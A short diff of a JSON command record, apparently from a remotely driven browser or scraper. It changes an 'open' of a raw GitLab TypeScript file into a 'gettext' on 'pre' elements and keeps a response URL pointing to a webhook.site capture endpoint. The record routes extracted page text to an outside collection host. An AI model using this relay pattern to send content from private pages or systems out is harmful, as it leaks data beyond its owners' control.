@@ -1,9 +1,9 @@
 {
-  "cmd_seq": 228,
-  "action": "open",
+  "cmd_seq": 229,
+  "action": "gettext",
   "args": {
-    "url": "https://gitlab.com/gaia-x/lab/wizards/compliance-wizard/-/raw/main/models/wallet.ts",
-    "timeout": 30
+    "selector": "pre",
+    "timeout": 20
   },
   "resp_url": "https://webhook.site/bc53085a-10ce-41e7-8c4d-120f043c2ad0"
 }
